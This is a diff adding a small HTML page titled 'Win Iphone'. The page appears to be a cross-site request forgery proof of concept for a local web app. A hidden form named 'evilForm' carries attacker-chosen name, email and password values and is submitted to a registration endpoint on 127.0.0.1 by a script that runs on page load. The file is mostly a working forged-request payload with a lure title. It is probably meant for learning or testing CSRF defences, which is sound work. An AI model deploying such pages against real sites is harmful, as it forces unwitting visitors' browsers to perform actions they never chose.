@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Win Iphone</title>
+  </head>
+  <body>
+    <h1>Win Iphone</h1>
+    <form
+      id="evilForm"
+      action="http://127.0.0.1:8000/registration/form/"
+      method="Post"
+      style="display: none"
+    >
+      <input type="text" name="name" value="I was hacked" />
+      <input type="text" name="email" value="hacked@example.com" />
+      <input
+        type="password"
+        name="password"
+        value="Attacker fake password or anything"
+      />
+    </form>
+
+    <script>
+      document.getElementById("evilForm").submit();
+    </script>
+  </body>
+</html>
